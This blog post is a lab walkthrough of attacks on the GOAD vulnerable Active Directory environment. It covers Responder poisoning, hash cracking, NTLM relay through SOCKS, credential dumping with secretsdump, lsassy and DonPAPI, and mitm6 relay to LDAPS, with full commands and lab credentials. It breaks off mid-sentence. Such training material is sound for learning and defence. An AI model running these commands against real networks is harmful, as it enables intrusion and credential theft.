<!DOCTYPE html><html lang="fr" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="GOAD - part 4 - poison and relay" /><meta property="og:locale" content="fr" /><meta name="description" content="In the previous post (Goad pwning part3) we start to dig on what to do when you got a user account. Before start exploiting the VMs with a user account, we will just step back to the state (without user account) and see what we can do with responder, mitm6 and NTLM relay !" /><meta property="og:description" content="In the previous post (Goad pwning part3) we start to dig on what to do when you got a user account. Before start exploiting the VMs with a user account, we will just step back to the state (without user account) and see what we can do with responder, mitm6 and NTLM relay !" /><link rel="canonical" href="https://mayfly277.github.io/posts/GOADv2-pwning-part4/" /><meta property="og:url" content="https://mayfly277.github.io/posts/GOADv2-pwning-part4/" /><meta property="og:site_name" content="Mayfly" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-12T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="GOAD - part 4 - poison and relay" /><meta name="twitter:site" content="@M4yFly" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"In the previous post (Goad pwning part3) we start to dig on what to do when you got a user account. Before start exploiting the VMs with a user account, we will just step back to the state (without user account) and see what we can do with responder, mitm6 and NTLM relay !","url":"https://mayfly277.github.io/posts/GOADv2-pwning-part4/","@type":"BlogPosting","headline":"GOAD - part 4 - poison and relay","dateModified":"2022-10-22T10:56:54+02:00","datePublished":"2022-07-12T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mayfly277.github.io/posts/GOADv2-pwning-part4/"},"@context":"https://schema.org"}</script><title>GOAD - part 4 - poison and relay | Mayfly</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Mayfly"><meta name="application-name" content="Mayfly"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/mayfly.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Mayfly</a></div><div class="site-subtitle font-italic">Hack, Code, Sleep, Repeat</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/mayfly277" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/M4yFly" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['mayfly277','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://www.root-me.org/mayfly" aria-label="rootme" class="order-6" target="_blank" rel="noopener"> <i class="fas fa-skull"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-7" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>GOAD - part 4 - poison and relay</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>GOAD - part 4 - poison and relay</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> mayfly </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Jul 12, 2022, 12:00 AM +0200" >Jul 12<i class="unloaded">2022-07-12T00:00:00+02:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Oct 22, 2022, 10:56 AM +0200" >Oct 22<i class="unloaded">2022-10-22T10:56:54+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1686 words">9 min read</span></div></div><div class="post-content"><p>In the previous post (<a href="/posts/GOADv2-pwning-part3/">Goad pwning part3</a>) we start to dig on what to do when you got a user account. Before start exploiting the VMs with a user account, we will just step back to the state (without user account) and see what we can do with responder, mitm6 and NTLM relay !</p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mindmap_relaypoisoning.png" alt="mindmap_relaypoisoning.png" /></p><h2 id="responder">Responder</h2><p>When you start a pentest without any creds, <a href="https://github.com/lgandx/Responder">responder</a> is a must run tool. In a standard windows active directory (without any modification) It will give you :</p><ul><li>usernames<li>netntlmv1 (if the server is very old) / netntlmv2 hashes<li>the ability to redirect the authentication (NTLM relay)<li>…</ul><p>In the lab, there are two bots to simulate LLMRN, MDNS and NBT-NS requests. One user has a weak password but no admin right. Another user has admin rights but uses a strong password.</p><p>Let start responder to see if we can get some informations.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>responder <span class="nt">-I</span> vboxnet0
</pre></table></code></div></div><p>Some minutes later we will get robb.stark netntlmv2 hash</p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/responder_capture_robb.png" alt="responder_capture_robb.png" /></p><ul><li>The bot try to make a smb connection to bravos instead of braavos. The dns doesn’t know bravos without two ‘a’ so by default windows will send a broadcast request to find the associated computer. With responder we answer to that broadcast query and say that this server is us, and so we get the connection from the user.</ul><p>After some more minutes (eddard bot is set to run every 5 minutes and robb every 3 minutes) we got also a connection from eddard.stark:</p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/responder_capture_eddard.png" alt="responder_capture_eddard.png" /></p><ul><li><p>The netntlm hashes are not usable to do pass the hash, but you can crack them to retrieve the password.</p><li><p>We create a file responder.hashes with the two hashes found and we will start to crack it with hashcat.</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>robb.stark::NORTH:1122334455667788:138B29A14C5A082F19F946BB3AFF537E:01010000000000000090C5E56494D801E5D2F5789054B95D0000000002000800480053003600340001001E00570049004E002D004C00420052004E0041004D0031005300540051005A0004003400570049004E002D004C00420052004E0041004D0031005300540051005A002E0048005300360034002E004C004F00430041004C000300140048005300360034002E004C004F00430041004C000500140048005300360034002E004C004F00430041004C00070008000090C5E56494D801060004000200000008003000300000000000000000000000003000002D4B5557B9EF589ECE5944B06785A55D686F279D120AC87BCBF6D0FEAA6663B90A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
eddard.stark::NORTH:1122334455667788:76E26250ABF96A09E68ADC5A9B1A4C29:01010000000000000090C5E56494D801CA05EDDA86BE30280000000002000800480053003600340001001E00570049004E002D004C00420052004E0041004D0031005300540051005A0004003400570049004E002D004C00420052004E0041004D0031005300540051005A002E0048005300360034002E004C004F00430041004C000300140048005300360034002E004C004F00430041004C000500140048005300360034002E004C004F00430041004C00070008000090C5E56494D801060004000200000008003000300000000000000000000000003000002D4B5557B9EF589ECE5944B06785A55D686F279D120AC87BCBF6D0FEAA6663B90A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
</pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>hashcat <span class="nt">-m</span> 5600 <span class="nt">--force</span> <span class="nt">-a</span> 0 responder.hashes /usr/share/wordlists/rockyou.txt 
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/hashcat_netntlm.png" alt="hashcat_netntlm.png" /></p><ul><li>We quickly get another user account <code class="language-plaintext highlighter-rouge">robb.stark:sexywolfy</code>. This is enough to pwn the north domain as robb is an administrator of winterfell (the north dc).<li>Eddard’s password is stronger and cannot be break with this method. This doesn’t mean we can do nothing. What we could do is relay eddard connection to a server where smb is not signed ;)</ul><blockquote><p>Responder keep the logs in /opt/tools/Responder/logs (on exegol), if you need to show them again.</p></blockquote><h2 id="ntlm-relay">NTLM relay</h2><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mindmap_relay.png" alt="mindmap_relay.png" /></p><h3 id="unsigned-smb">Unsigned SMB</h3><p>Let’s start hunting unsigned smb in the lab and generate a list of IP targets.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cme smb 192.168.56.10-23 <span class="nt">--gen-relay-list</span> relay.txt
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/smb_unsigned.png" alt="smb_unsigned.png" /></p><p>Ok now we got a list of <code class="language-plaintext highlighter-rouge">signing:False</code> smb computers, we can start to try to relay ntlm authentication to them.</p><h3 id="responder--ntlmrelayx-to-smb">responder + ntlmrelayx to smb</h3><p>Before starting responder to poison the answer to LLMNR, MDNS and NBT-NS request we must stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/HTTP = On/HTTP = Off/g'</span> /opt/tools/Responder/Responder.conf <span class="o">&amp;&amp;</span> <span class="nb">cat</span> /opt/tools/Responder/Responder.conf | <span class="nb">grep</span> <span class="nt">--color</span><span class="o">=</span>never <span class="s1">'HTTP ='</span>
<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/SMB = On/SMB = Off/g'</span> /opt/tools/Responder/Responder.conf <span class="o">&amp;&amp;</span> <span class="nb">cat</span> /opt/tools/Responder/Responder.conf | <span class="nb">grep</span> <span class="nt">--color</span><span class="o">=</span>never <span class="s1">'SMB ='</span>
</pre></table></code></div></div><p>Next, we start ntlmrelayx</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ntlmrelayx <span class="nt">-tf</span> smb_targets.txt <span class="nt">-of</span> netntlm <span class="nt">-smb2support</span> <span class="nt">-socks</span>
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">-tf</code> : list of targets to relay the authentication<li><code class="language-plaintext highlighter-rouge">-of</code> : output file, this will keep the captured smb hashes just like we did before with responder, to crack them later<li><code class="language-plaintext highlighter-rouge">-smb2support</code> : support for smb2<li><code class="language-plaintext highlighter-rouge">-socks</code> : will start a socks proxy to use relayed authentication</ul><p>The program send back this error :</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>Type help for list of commands
    self._target(*self._args, **self._kwargs)
  File "/usr/local/lib/python3.10/dist-packages/impacket/examples/ntlmrelayx/servers/socksserver.py", line 247, in webService
    from flask import Flask, jsonify
  File "/usr/local/lib/python3.10/dist-packages/flask/__init__.py", line 19, in &lt;module&gt;
    from jinja2 import Markup, escape
ImportError: cannot import name 'Markup' from 'jinja2' (/usr/local/lib/python3.10/dist-packages/jinja2/__init__.py)
</pre></table></code></div></div><p>let’s fix it :</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>pip3 <span class="nb">install </span>Flask Jinja2 <span class="nt">--upgrade</span>
</pre></table></code></div></div><ul><li>Relaunch ntlmrelayx, fine it work :)</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ntlmrelayx <span class="nt">-tf</span> smb_targets.txt <span class="nt">-of</span> netntlm <span class="nt">-smb2support</span> <span class="nt">-socks</span>
</pre></table></code></div></div><ul><li>Start responder to redirect queries to the relay server</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>responder -I vboxnet0
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/ntlm_relay.png" alt="ntlm_relay.png" /></p><ul><li>The poisoned connections are relayed to castelblack (192.168.56.22) and essos (192.168.56.23) and a socks proxy is setup to use the connection.<li>As eddard.stark is a domain administrator of north.sevenkingdoms.local he got administrator privileges on castelback.</ul><p>Now we can use this relay to get an access to the computer as an administrator</p><h3 id="use-a-socks-relay-with-an-admin-account">Use a socks relay with an admin account</h3><h4 id="secretsdump">Secretsdump</h4><ul><li>Use secretsdump to get SAM database, LSA cached logon, machine account and some DPAPI informations</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>proxychains secretsdump <span class="nt">-no-pass</span> <span class="s1">'NORTH'</span>/<span class="s1">'EDDARD.STARK'</span>@<span class="s1">'192.168.56.22'</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/proxychains_secretsdump.png" alt="proxychains_secretsdump.png" /></p><ul><li>The sam database contains the local accounts. We will ignore vagrant as it is the default user to setup the lab.<li>The important information here is the NT hash of the local administrator user.<li>We also got the LSA cache of the last connected users (by default windows keep the last 10 users), this is useful to connect to the server even if the domain controller is unreachable. But those cached credentials can be cracked offline with hashcat (very slow).<li>And to finish we also got the hash of the computer account. (Sometimes you will get no useful domain accounts or no information at all on a domain joined computer but if you get this hash you got an account on the domain!)</ul><blockquote><p>With a machine account you can query the ldap like any other users and you can also run bloodhound ingestor ;)</p></blockquote><h4 id="lsassy">Lsassy</h4><ul><li>Use lsassy to get the lsass process stored credentials<li>Domain accounts informations are stored in the LSASS process so make a dump of this process can give you more domain accounts and privileges.<li><a href="https://github.com/Hackndo/lsassy">Lsassy</a> allow you to dump lsass remotely (very more convenient then doing a procdump, download of the lsass dump file and doing pypykatz or mimikatz locally), it do all the painful actions like dump and read lsass content for you (it also dump only the usefull part of the lsass dump optimizing the time of transfer). (lsassy also exist as a cme module)</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/proxychains_lsassy.png" alt="proxychains_lsassy.png" /></p><h4 id="donpapi">DonPapi</h4><ul><li>My third favorite tool to retreive secrets of windows with linux is <a href="https://github.com/login-securite/DonPAPI">donPAPI</a>, it is used to get dpapi and other passwords stored informations (files, browser, schedule tasks,…). This tool don’t touch LSASS so it is stealthier and work most of the time even if av and edr are enabled on the target.</ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>proxychains DonPAPI -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/donpapi1.png" alt="donpapi1.png" /></p><ul><li><p>DonPapi give us the stored password for the sql service sql_svc:YouWillNotKerboroast1ngMeeeeee</p><li><p>We also get the password of robb.stark due to a scheduled task setup on this computer too.</p></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/robb_stark_schedule_task.png" alt="robb_stark_schedule_task.png" /></p><h4 id="smbclient">Smbclient</h4><ul><li>Connect directly to the smbserver with smbclient</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>proxychains smbclient.py <span class="nt">-no-pass</span> <span class="s1">'NORTH'</span>/<span class="s1">'EDDARD.STARK'</span>@<span class="s1">'192.168.56.22'</span> <span class="nt">-debug</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/proxychains_smb_exec.png" alt="proxychains_smb_exec.png" /></p><h4 id="code-execution--smbexec-or-atexec">Code execution : smbexec or atexec</h4><ul><li>With a socks connection you can only use smbexec or atexec. Neither wmiexec, psexec nor dcomexec will work. (explainations here : <a href="https://github.com/SecureAuthCorp/impacket/issues/412">https://github.com/SecureAuthCorp/impacket/issues/412</a> )</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>proxychains smbexec.py <span class="nt">-no-pass</span> <span class="s1">'NORTH'</span>/<span class="s1">'EDDARD.STARK'</span>@<span class="s1">'192.168.56.22'</span> <span class="nt">-debug</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/smb_exec.png" alt="smb_exec.png" /></p><h2 id="mitm6--ntlmrelayx-to-ldap">Mitm6 + ntlmrelayx to ldap</h2><p>Another useful way to poison the network is by giving answer to DHCPv6 requests and setting our host as the default DNS server. Windows by default prefers IPv6 over IPv4 so we could capture and poison the response to DHCPv6 query to change the DNS server and redirect queries to our machine with the tool <a href="https://github.com/dirkjanm/mitm6">MITM6</a>.</p><ul><li>We will start mitm6 to poison dhcpv6 and get dns request from the hosts<li>As a side note, i notice we can poison domain controler but after that the DC’s doesn’t care and still use their localhost dns server.<li><p>So we must target servers</p><li><p>For this example we will poison braavos server. We will answer to wpad queries and relay the http query to ldaps on meereen to add a computer with delegate access.</p><li>~First we need to make small changes on braavos.local network configuration~ (Edit: Not needed anymore if you did the ansible provisioning after 08/18/2022)<li>Connect to braavos with khal.drogo:horse on rdp and change the dns server of the ethernet to automatic (i will fix that in the ansible lab playbooks soon but for now you will have to do that by hand). Change only the first ethernet connection to automatic dns.</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/dns_change_part1.png" alt="dns_change_part1.png" /></p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/dns_change_part2.png" alt="dns_change_part2.png" /></p><ul><li>start poisoning with mitm6 and start ntlmrelayx</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>mitm6 <span class="nt">-i</span> vboxnet0 <span class="nt">-d</span> essos.local <span class="nt">-d</span> sevenkingdoms.local <span class="nt">-d</span> north.sevenkingdoms.local <span class="nt">--debug</span>
</pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ntlmrelayx.py <span class="nt">-6</span> <span class="nt">-wh</span> wpadfakeserver.essos.local <span class="nt">-t</span> ldaps://meereen.essos.local <span class="nt">--add-computer</span> relayedpccreate <span class="nt">--delegate-access</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mitm6_poisoning.png" alt="mitm6_poisoning.png" /></p><ul><li>As we can see the dns is now poisonned</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/dns_poisonned.png" alt="dns_poisonned.png" /></p><ul><li>We wait for a wpad http query to relay the request to the ldaps (you can reboot the VM to poison and exploit without waiting)</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/relay_http_ldaps.png" alt="relay_http_ldaps.png" /></p><ul><li><p>A new computer has been created with delegate access to Braavos$ because we poison Braavos$ computer account and it can set the msDS-AllowedToActOnBehalfOfOtherIdentity on the created computer.</p><li><p>And we can continue with RBCD exploitation just like in the next paragraph (with getST to call s4u2proxy)</p><li><p>If we specify a loot dir all the informations on the ldap are automatically dumped</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot
</pre></table></code></div></div><ul><li>Open an rdp with essos.local/khal.drogo:horse<li>When the relay is up and running we can get all the domain information</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/ldap_relay_loot1.png" alt="ldap_relay_loot1.png" /></p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/ldap_relay_loot2.png" alt="ldap_relay_loot2.png" /></p><p><img data-proofer-ignore data-src="/assets/blog/GOAD/loot.png" alt="loot.png" /></p><blockquote><p>Another thing we could do is also relay to smb server just like what we did with responder (but there is no bot for now to do it so you have to do the poisoned victim)</p></blockquote><h2 id="coerced-auth-smb--ntlmrelayx-to-ldaps-with-drop-the-mic">Coerced auth smb + ntlmrelayx to ldaps with drop the mic</h2><p><img data-proofer-ignore data-src="/assets/blog/GOAD/coerced_auth_lateral_move.png" alt="coerced_auth_lateral_move.png" /></p><p>We can coerce a connection from meereen DC to our host using multiple methods (petitpotam, printerbug, DFSCoerce). To force a coerce without choosing between the different methods, we can use the all-in-one tool who just came up <a 